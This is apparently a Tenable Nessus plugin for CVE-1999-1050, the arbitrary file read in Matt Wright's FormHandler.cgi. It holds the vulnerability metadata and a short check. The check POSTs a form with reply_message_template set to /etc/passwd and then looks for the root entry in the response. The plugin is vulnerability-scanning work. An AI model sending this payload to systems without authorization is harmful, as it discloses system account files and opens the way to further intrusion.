#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10075);
 script_version ("$Revision: 1.36 $");
 script_cvs_date("$Date: 2017/05/09 15:19:41 $");

 script_cve_id("CVE-1999-1050");
 script_bugtraq_id(799);
 script_osvdb_id(7012, 7013);

 script_name(english:"Matt Wright FormHandler.cgi Arbitrary File Access");
 script_summary(english:"Attempts to read /etc/passwd.");
 
 script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by an information
disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'FormHandler.cgi' CGI application installed on the remote host is
affected by an information disclosure vulnerability that lets anyone
read arbitrary files with the privileges of the web server. An
unauthenticated, remote attacker can exploit this to disclose
sensitive information, which could be used to facilitate further
attacks.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Nov/166");
 script_set_attribute(attribute:"solution", value:
"Remove FormHandler.cgi from the web server.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:U/RC:X");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value: "1999/11/11");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/12/13");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 1999-2017 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "smtp_settings.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

domain = get_kb_item("Settings/third_party_domain");
if(!domain) domain = "nessus.org";

url = '/FormHandler.cgi';
header = make_array("Content-type", "application/x-www-form-urlencoded");
postdata = string(
  "realname=", SCRIPT_NAME, "&",
  "email=aaa&",
  "reply_message_template=%2Fetc%2Fpasswd&",
  "reply_message_from=nessus%40", domain, "&",
  "redirect=http%3A%2F%2Fwww.", domain, "&",
  "recipient=nessus%40", domain
);
res = http_send_recv3(
  method:"POST",
  item:url,
  port:port,
  add_headers:header,
  data:postdata
);
if (isnull(res)) exit(1, "The server on port "+port+" didn't respond.");

if(egrep(pattern:"root:.*:0:[01]:.*", string:res[2])) security_warning(port);

